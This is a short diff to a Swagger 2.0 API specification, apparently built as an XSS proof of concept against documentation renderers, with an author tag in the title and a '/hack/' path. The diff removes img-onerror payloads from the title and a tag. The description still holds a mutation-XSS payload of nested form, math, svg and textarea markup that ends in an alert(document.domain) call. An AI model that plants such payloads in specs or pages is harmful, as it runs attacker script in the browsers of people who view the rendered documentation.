@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY khalidou_kh"><img onerror=alert(document.domain) src=1>
+  title: XSS Attack BY khalidou_kh
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
   version: production
@@ -20,7 +20,7 @@ paths:
         '200':
           description: No response was specified
       tags:
-        - <img onerror=alert(document.domain) src=1>
+        - xss 
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
